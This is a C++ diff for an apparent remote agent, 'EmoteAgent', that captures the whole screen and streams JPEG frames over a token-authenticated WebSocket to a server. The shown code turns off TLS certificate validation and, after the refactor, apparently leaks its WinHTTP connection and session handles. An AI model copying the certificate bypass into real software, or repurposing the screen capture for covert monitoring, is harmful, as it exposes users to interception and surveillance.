@@ -532,21 +532,16 @@ static std::vector<BYTE> capture_screen_jpeg(int quality = 50) {
     int screenW = GetSystemMetrics(SM_CXSCREEN);
     int screenH = GetSystemMetrics(SM_CYSCREEN);
 
-    // Scale to 1920 wide max (keeps full screen visible, good perf)
+    // Capture at native resolution (no downscale)
     int capW = screenW, capH = screenH;
-    if (capW > 1920) {
-        capH = (int)((double)capH * 1920.0 / capW);
-        capW = 1920;
-    }
 
     HDC hScreen = GetDC(NULL);
     HDC hMemDC = CreateCompatibleDC(hScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, capW, capH);
     HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);
 
-    // Use StretchBlt for scaling
-    SetStretchBltMode(hMemDC, HALFTONE);
-    StretchBlt(hMemDC, 0, 0, capW, capH, hScreen, 0, 0, screenW, screenH, SRCCOPY);
+    // BitBlt for native res (fastest, pixel-perfect)
+    BitBlt(hMemDC, 0, 0, capW, capH, hScreen, 0, 0, SRCCOPY);
 
     SelectObject(hMemDC, hOld);
 
@@ -1070,127 +1065,113 @@ static void execute_command(const Command& cmd) {
 }
 
 // ============================================================
-// SCREEN STREAMING THREAD (WebSocket)
+// SCREEN STREAMING — DOUBLE-BUFFER PIPELINE
 // ============================================================
+// Two threads run in parallel for max FPS:
+//   Capture thread: GDI capture + JPEG encode → shared buffer
+//   Send thread:    shared buffer → WebSocket send
+// Capture and send overlap, roughly doubling throughput.
 
-static DWORD WINAPI screen_stream_thread(LPVOID param) {
-    InterlockedExchange(&g_streaming, 1);
-    printf("  [Screen streaming: connecting WebSocket...]\n");
+static CRITICAL_SECTION g_frame_cs;
+static HANDLE g_frame_ready = NULL;
+static std::vector<BYTE> g_frame_buf;
+static volatile LONG g_ws_alive = 0;
 
-    // Open WinHTTP session
+static DWORD WINAPI capture_loop_thread(LPVOID param) {
+    while (InterlockedCompareExchange(&g_stream_requested, 1, 1) &&
+           InterlockedCompareExchange(&g_ws_alive, 1, 1)) {
+        auto jpeg = capture_screen_jpeg(40);
+        if (!jpeg.empty()) {
+            EnterCriticalSection(&g_frame_cs);
+            g_frame_buf.swap(jpeg);
+            LeaveCriticalSection(&g_frame_cs);
+            SetEvent(g_frame_ready);
+        }
+    }
+    return 0;
+}
+
+static HINTERNET open_stream_websocket() {
     HINTERNET hSession = WinHttpOpen(L"EmoteAgent/2.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) {
-        printf("  [Screen WS: WinHttpOpen failed]\n");
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
-    }
+    if (!hSession) return NULL;
 
     HINTERNET hConnect = WinHttpConnect(hSession, g_url.host.c_str(), g_url.port, 0);
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: WinHttpConnect failed]\n");
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
-    }
+    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
 
-    // Build path with query params
     std::string ws_path = "/?role=agent&session=" + std::to_string(g_session_id) + "&token=" + g_token;
     DWORD flags = g_url.https ? WINHTTP_FLAG_SECURE : 0;
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", to_wide(ws_path).c_str(),
         NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: WinHttpOpenRequest failed]\n");
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
-    }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
 
-    // Ignore cert errors for dev
     if (g_url.https) {
-        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
     }
 
-    // Request WebSocket upgrade
-    BOOL ok = WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
-    if (!ok) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET failed]\n");
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL;
     }
 
-    ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    if (!ok) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: SendRequest failed (%lu)]\n", GetLastError());
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
-    }
-
-    ok = WinHttpReceiveResponse(hRequest, NULL);
-    if (!ok) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: ReceiveResponse failed (%lu)]\n", GetLastError());
-        InterlockedExchange(&g_streaming, 0);
-        return 0;
-    }
-
-    // Complete the WebSocket handshake
     HINTERNET hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, 0);
-    WinHttpCloseHandle(hRequest); // No longer needed after upgrade
+    WinHttpCloseHandle(hRequest);
+    if (!hWebSocket) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
+
+    BYTE recvBuf[512]; DWORD bytesRead = 0; WINHTTP_WEB_SOCKET_BUFFER_TYPE bufType;
+    WinHttpWebSocketReceive(hWebSocket, recvBuf, sizeof(recvBuf), &bytesRead, &bufType);
+    return hWebSocket;
+}
+
+static DWORD WINAPI screen_stream_thread(LPVOID param) {
+    InterlockedExchange(&g_streaming, 1);
+    printf("  [Screen streaming: connecting...]\n");
+
+    HINTERNET hWebSocket = open_stream_websocket();
     if (!hWebSocket) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        printf("  [Screen WS: WebSocket upgrade failed (%lu)]\n", GetLastError());
+        printf("  [Screen WS: connection failed]\n");
         InterlockedExchange(&g_streaming, 0);
         return 0;
     }
 
-    printf("  [Screen streaming started via WebSocket]\n");
+    printf("  [Screen streaming started — pipeline mode]\n");
+    InterlockedExchange(&g_ws_alive, 1);
 
-    // Read the initial "stream_start" message (non-blocking, just consume it)
-    BYTE recvBuf[512];
-    DWORD bytesRead = 0;
-    WINHTTP_WEB_SOCKET_BUFFER_TYPE bufType;
-    WinHttpWebSocketReceive(hWebSocket, recvBuf, sizeof(recvBuf), &bytesRead, &bufType);
+    InitializeCriticalSection(&g_frame_cs);
+    g_frame_ready = CreateEvent(NULL, FALSE, FALSE, NULL);
 
-    // Stream frames until told to stop
+    HANDLE hCapture = CreateThread(NULL, 0, capture_loop_thread, NULL, 0, NULL);
+
     while (InterlockedCompareExchange(&g_stream_requested, 1, 1)) {
-        auto jpeg = capture_screen_jpeg(35);
-        if (!jpeg.empty()) {
-            DWORD err = WinHttpWebSocketSend(hWebSocket,
-                WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
-                (PVOID)jpeg.data(), (DWORD)jpeg.size());
-            if (err != ERROR_SUCCESS) {
-                printf("  [Screen WS: send failed (%lu)]\n", err);
-                break;
-            }
-        }
+        if (WaitForSingleObject(g_frame_ready, 1000) == WAIT_TIMEOUT) continue;
 
-        // Check for incoming "stream_stop" message (non-blocking peek)
-        // We do a quick non-blocking check by using a tiny timeout
-        // Actually, just rely on g_stream_requested flag from command poll
+        std::vector<BYTE> frame;
+        EnterCriticalSection(&g_frame_cs);
+        frame.swap(g_frame_buf);
+        LeaveCriticalSection(&g_frame_cs);
+        if (frame.empty()) continue;
+
+        DWORD err = WinHttpWebSocketSend(hWebSocket,
+            WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
+            (PVOID)frame.data(), (DWORD)frame.size());
+        if (err != ERROR_SUCCESS) {
+            printf("  [Screen WS: send failed (%lu)]\n", err);
+            break;
+        }
     }
 
-    // Close WebSocket gracefully
+    InterlockedExchange(&g_ws_alive, 0);
+    WaitForSingleObject(hCapture, 3000);
+    CloseHandle(hCapture);
+    CloseHandle(g_frame_ready);
+    DeleteCriticalSection(&g_frame_cs);
+
     WinHttpWebSocketClose(hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
     WinHttpCloseHandle(hWebSocket);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
 
     InterlockedExchange(&g_streaming, 0);
     printf("  [Screen streaming stopped]\n");
